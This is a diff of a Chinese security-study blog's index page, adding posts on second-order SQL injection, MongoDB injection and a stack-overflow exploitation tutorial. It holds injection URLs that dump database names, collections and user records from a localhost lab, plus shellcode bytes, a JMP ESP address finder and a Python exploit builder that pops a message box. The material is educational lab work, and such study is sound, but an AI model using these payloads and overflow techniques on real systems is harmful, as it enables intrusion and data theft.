@@ -169,6 +169,210 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-二次注入与MongDB注入学习总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/14/二次注入与MongDB注入学习总结/">二次注入与MongDB注入学习总结</a>
+    </h1>
+  
+
+        
+        <a href="/2018/09/14/二次注入与MongDB注入学习总结/" class="archive-article-date">
+  	<time datetime="2018-09-14T01:35:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>二阶注入</p>
+<p>基础</p>
+<p>addslashes()函数</p>
+<p>​                                                  </p>
+<p>所以如果在源码中先用该函数过滤单引号后再写入数据库中是怎样的？</p>
+<p>可以看到\并没有写入数据库中</p>
+<p>mysqli_real_escape_string() 函数 </p>
+<p>mysql_real_escape_string()</p>
+<p>魔术函数</p>
+<p>Magic_quotes_gpc函数   </p>
+<p>当在PHP配置中设置后，会自动在GET POST COOKIE中将单引号(‘) 双引号(“) 反斜杠() 空字符(null)前面加上反斜杠（\）,但是不会过滤$_SERVER全局变量  所以可以利用HTTP头中的cilent-ip referer x-forward-for等变量，但是在php5.4.0之后都取消了</p>
+<p>Magic_quotes_runtime函数  </p>
+<p>与Magic_quotes_gpc函数处理方式相同，但是处理的对象不同，仅对从数据库以及文件中获取的数据进行处理 同样在PHP5.4之后取消了</p>
+<p>Magic_quotes_sybase函数  </p>
+<p>与Magic_quotes_gpc函数大致一致，区别在于处理方式不同，仅仅转义空格符以及将单引号转换成双引号，但是同样在PHP5.4之后取消了</p>
+<p>5.4版本之后</p>
+<p>因此对于5.4.0之后的PHP版本就不必要关心这些函数</p>
+<p>二次注入案例</p>
+<p>假设这个是一个注册页面</p>
+<p>以addslashes()函数为例 借用前边的代码</p>
+<p>此时是信息修改页面</p>
+<p>将username直接写到另一个表中，代码如下</p>
+<p>可以看到库名与用户被注入出来</p>
+<p>NoSQL注入</p>
+<p>MongoDB注入</p>
+<p>安装过程<a href="https://blog.csdn.net/qq_36030288/article/details/54173008" target="_blank" rel="noopener">https://blog.csdn.net/qq_36030288/article/details/54173008</a></p>
+<p>表示安装成功</p>
+<p>测试环境源代码</p>
+<p>Mongodb数据库</p>
+<p>正常访问</p>
+<p>注入访问</p>
+<p>由于mongodb对于多维数组进行解析，而php也可以传入数组类型，利用这个特性我们就可以传入一些操作符，这个操作符通常就是数组的键值</p>
+<p>$ne  代表不等于 可以看到在mongodb中执行该语句与我们在PHP中得到的结果一致</p>
+<p>操作符除了$ne之外</p>
+<p>$gt : &gt;      大于</p>
+<p>$gte : &gt;=    大于等于</p>
+<p>$lt : &lt;       小于</p>
+<p>$lte : &lt;=     小于等于</p>
+<p>不回显时，怎么能注入出数据，跟sql盲注一致，通过返回状态盲注判断</p>
+<p>环境搭建</p>
+<p>可以通过返回的内容来判断flag值是否正确，这里使用regex正则匹配的方式来盲注出flag变量的值</p>
+<p>可以检测出flag变量有a，接下来通过这个思维来写个py跑出来</p>
+<p>报错注入</p>
+<p>测试环境</p>
+<p><a href="http://localhost/sql/sql9.php?username=1%27});return{username:1,password:2}})//&amp;password=admin123" target="_blank" rel="noopener">http://localhost/sql/sql9.php?username=1%27});return{username:1,password:2}})//&amp;password=admin123</a></p>
+<p>爆版本号</p>
+<p>爆出库名</p>
+<p><a href="http://localhost/sql/sql9.php?username=1%27%7d" target="_blank" rel="noopener">http://localhost/sql/sql9.php?username=1%27});return{username:db.getName(),password:2}})//&amp;password=admin123</a>;return%7busername:db.getName(),password:2%7d%7d)//&amp;password=admin123)</p>
+<p>爆集合名</p>
+<p><a href="http://localhost/sql/sql9.php?username=1%27});return{username:tojson(db.getCollectionNames()),password:2}})//&amp;password=admin123" target="_blank" rel="noopener">http://localhost/sql/sql9.php?username=1%27});return{username:tojson(db.getCollectionNames()),password:2}})//&amp;password=admin123</a></p>
+<p>爆数据</p>
+<p><a href="http://localhost/sql/sql9.php?username=1%27});return{username:tojson(db.user.find()[0]),password:2}})//&amp;password=admin123" target="_blank" rel="noopener">http://localhost/sql/sql9.php?username=1%27});return{username:tojson(db.user.find()[0]),password:2}})//&amp;password=admin123</a></p>
+<p>参考资料</p>
+<p><a href="https://www.cnblogs.com/wpjzh/p/5999363.html" target="_blank" rel="noopener">https://www.cnblogs.com/wpjzh/p/5999363.html</a>  mongodb基本操作</p>
+<p>Redis注入</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">注入 web安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/14/二次注入与MongDB注入学习总结/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-SSTI服务端模板注入攻击学习总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/13/SSTI服务端模板注入攻击学习总结/">SSTI服务端模板注入攻击学习总结</a>
+    </h1>
+  
+
+        
+        <a href="/2018/09/13/SSTI服务端模板注入攻击学习总结/" class="archive-article-date">
+  	<time datetime="2018-09-13T01:57:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-13</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>0x00 前言</p>
+<p>0x0 参考</p>
+<p><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">SSTI注入 web安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/13/SSTI服务端模板注入攻击学习总结/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-网鼎杯第四场web题复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -439,12 +643,95 @@
 <p>buffer的起始地址为0x0012FAF0,因此第53-56位将写入buffer的起始地址，buffer里边写shellcode，这里的目的是为了弹框，因此要得到弹框所必须的dll函数MessageBoxA在当前系统中的内存入口地址，通过vc6自带的depends工具分析得到调用的user32.dll基地址为0x77D10000,MessageBoxA偏移地址为0x000407EA ,MessageBoxA的内存入口地址为0x77D507EA</p>
 <p><img src="\img\1536740485760.png" alt="1536740485760"></p>
 <p>此时万事俱备，只需要编写shellcode即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">33DB                          XOR EBX，EBX</span><br><span class="line">53                            PUSH EbX</span><br><span class="line">6877657374                    PUSH 74736577</span><br><span class="line">686661696C                    PUSH 6C696166   </span><br><span class="line">8BC4                          MOV EAX,ESp</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">B8EA07D577                    MOV EAX,77D507EA</span><br><span class="line">FFD0                          CALL EAX</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">33DB                          XOR EBX，EBX</span><br><span class="line">53                            PUSH EbX</span><br><span class="line">6877657374                    PUSH 74736577</span><br><span class="line">686661696C                    PUSH 6C696166   </span><br><span class="line">8BC4                          MOV EAX,ESP</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">B8EA07D577                    MOV EAX,77D507EA</span><br><span class="line">FFD0                          CALL EAX</span><br></pre></td></tr></table></figure>
 <p>使用十六进制将其写到password.txt 中，开头写shellcode机器码，第53-56写buffer的地址0x0012FAF0,中间则以0x90(nop)填充，这里可以借助python来快速编写</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">shellcode1 = &apos;33DB536877657374686661696C8BC453505053B8EA07D577FFD0&apos;</span><br><span class="line">shellcode2 = &apos;90&apos;*26</span><br><span class="line">shellcode = shellcode1+shellcode2+&apos;F0FA1200&apos;     //由于是小端序，低位数保存在低位地址，所以导致写</span><br><span class="line"></span><br><span class="line">print shellcode</span><br><span class="line">print len(shellcode)</span><br></pre></td></tr></table></figure>
 <p>使用十六进制器进行编写<img src="\img\1536742887319.png" alt="1536742887319"></p>
 <p>保存再去执行下 程序就发现弹框</p>
 <p><img src="\img\1536742937735.png" alt="1536742937735"></p>
+<h2 id="0x0e-栈溢出ESP跳板定位"><a href="#0x0e-栈溢出ESP跳板定位" class="headerlink" title="0x0e 栈溢出ESP跳板定位"></a>0x0e 栈溢出ESP跳板定位</h2><p>由于0x0d小节中的改写成shellcode的起始地址是固定的，但是在实际的漏洞利用中，由于动态链接库的载入和卸载等原因，再加上不同的系统动态链接库函数在内存中的地址是不同的，windows进程的函数栈帧很有可能发生“移位”，shellcode在内存中的地址就会发生变化，因此如果单纯把返回地址覆盖为shellcode的起始地址，可能漏洞利用成功率极低，为了提高成功率，最好能够选择一个能够在程序运行中动态定位栈中的shellcode。</p>
+<p>通过观察发现，在函数返回时，ESP恰好指向栈帧中返回地址的下一个位置，因为我们可以利用ESP来定位摆放shellcode的位置</p>
+<p><img src="\img\1537328541144.png" alt="1537328541144"></p>
+<p>简单描述下整个过程：</p>
+<p>1） 首先用任意一个JMP ESP的地址来覆盖函数返回地址</p>
+<p>2） 函数返回地址被覆盖后，EIP读取到该地址后就会跳转到这条JMP ESP指令</p>
+<p>3） JMP ESP指令被执行后，处理器会到栈区函数返回地址之后的地方继续取指令执行，此时将shellcode摆放在此处，就可以执行shellcode</p>
+<p>4）因此在布置shellcode时，先将返回地址之前的用nop（0x90）来覆盖，返回地址用JMP ESP地址覆盖，返回地址之后的使用shellcode 来覆盖即可</p>
+<p>这里shellcode为了完整，之前只是弹出框无法关闭因此需要添加一个exit()函数，与弹框定位messageboxA函数一致，使用同样的方式定位exit函数，exit在kernel32.dll动态链接库文件中，且对应的函数为exitprocess()函数，得到函数入口的最终的内存地址为0x7C81CAFA,这个地址会随着不同的系统版本有变化的，自己测试的时候一定要看清楚自己的地址，避免实验无法成功</p>
+<p><img src="\img\1537329151333.png" alt="1537329151333"></p>
+<p>将shellcode基于之前的修改一下，实际上仅仅只是在后边添加上exitprocess函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">33DB                          XOR EBX，EBX</span><br><span class="line">53                            PUSH EbX</span><br><span class="line">6877657374                    PUSH 74736577</span><br><span class="line">686661696C                    PUSH 6C696166   </span><br><span class="line">8BC4                          MOV EAX,ESP</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">B8EA07D577                    MOV EAX,77D507EA</span><br><span class="line">FFD0                          CALL EAX            </span><br><span class="line">53                            PUSH EBX                //添加exit()函数</span><br><span class="line">B8FACA817C                    MOV EAX，0x7C81CAFA</span><br><span class="line">FFD0                          CALL EAX</span><br></pre></td></tr></table></figure>
+<p>编写exp，通过之前上一小节分析，得知如果覆盖到返回地址，则需要56个字节，其中第53到56字节则是对应的返回地址，其中返回地址则被覆盖为任意一个JMP ESP的地址，之前的字节则用nop(0x90)填充</p>
+<p>如何获取到任意一个地址，可以通过看学的OllyUni.dll插件，下载放在OllyDbg的plugins目录重启即可，或者可以采用以下代码定位：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define DLL_NAME &quot;user32.dll&quot;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	BYTE* ptr;</span><br><span class="line">	int position,address;</span><br><span class="line">	HINSTANCE handle;</span><br><span class="line">	BOOL done_flag = FALSE;</span><br><span class="line"></span><br><span class="line">	handle=LoadLibrary(DLL_NAME);</span><br><span class="line"></span><br><span class="line">	if(!handle)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot; load dll erro !&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ptr = (BYTE*)handle;</span><br><span class="line">	</span><br><span class="line">	for(position = 0; !done_flag; position++)</span><br><span class="line">	&#123;</span><br><span class="line">		try</span><br><span class="line">		&#123;</span><br><span class="line">			if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4)</span><br><span class="line">			&#123;</span><br><span class="line">				//0xFFE4 is the opcode of jmp esp</span><br><span class="line">				int address = (int)ptr + position;</span><br><span class="line">				printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		catch(...)</span><br><span class="line">		&#123;</span><br><span class="line">			int address = (int)ptr + position;</span><br><span class="line">			printf(&quot;END OF 0x%x\n&quot;, address);</span><br><span class="line">			done_flag = true;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中JMP ESP对应的字节码为0xFFE4，以下是常见的跳转指令与机器码的对应关系</p>
+<table>
+<thead>
+<tr>
+<th>机器码（十六进制）</th>
+<th>对应的跳转指令</th>
+<th>机器码（十六进制）</th>
+<th>对应的跳转指令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FF E0</td>
+<td>JMP EAX</td>
+<td>FF D0</td>
+<td>CALL EAX</td>
+</tr>
+<tr>
+<td>FF E1</td>
+<td>JMP ECX</td>
+<td>FF D1</td>
+<td>CALL ECX</td>
+</tr>
+<tr>
+<td>FF E2</td>
+<td>JMP EDX</td>
+<td>FF D2</td>
+<td>CALL EDX</td>
+</tr>
+<tr>
+<td>FF E3</td>
+<td>JMP EBX</td>
+<td>FF D3</td>
+<td>CALL EBX</td>
+</tr>
+<tr>
+<td>FF E4</td>
+<td>JMP ESP</td>
+<td>FF D4</td>
+<td>CALL ESP</td>
+</tr>
+<tr>
+<td>FF E5</td>
+<td>JMP EBP</td>
+<td>FF D5</td>
+<td>CALL EBP</td>
+</tr>
+<tr>
+<td>FF E6</td>
+<td>JMP ESI</td>
+<td>FF E6</td>
+<td>CALL ESI</td>
+</tr>
+<tr>
+<td>FF E7</td>
+<td>JMP EDI</td>
+<td>FF E7</td>
+<td>CALL EDI</td>
+</tr>
+</tbody>
+</table>
+<p>执行后找到其中一个JMP ESP的内存地址，例如0x77DF3B63,赋给exp的第53到56字节即可</p>
+<p><img src="\img\1537339673165.png" alt="1537339673165"></p>
+<p>使用python编写一下exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">shellcode1 = &apos;90&apos;*52</span><br><span class="line">shellcode2 = &apos;633BDF77&apos;</span><br><span class="line">shellcode3 = &apos;33DB536877657374686661696C8BC453505053B8EA07D577FFD053B8FACA817CFFD0&apos;</span><br><span class="line">shellcode = shellcode1+shellcode2+shellcode3</span><br><span class="line">print shellcode</span><br></pre></td></tr></table></figure>
+<p>将得到的shellcode通过十六进制编辑器，写到password文本，运行之前的程序</p>
+<p><img src="\img\1537340550370.png" alt="1537340550370"></p>
+<p>此时点击确定时就可以直接退出，不会遗留一个DOS界面</p>
 
       
 
@@ -1115,77 +1402,10 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/15/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/15/hello-world/" class="archive-article-date">
-  	<time datetime="2018-08-15T02:30:45.759Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/15/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
   
 
 
@@ -1308,6 +1528,10 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">SSTI注入 web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">SSRF WEB安全</a>
               </li>
              
@@ -1320,11 +1544,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">CTF学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">XSS</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF学习</a>
+                <a href="javascript:void(0)" class="js-tag color4">注入 web安全</a>
               </li>
             
             <div class="clearfix"></div>
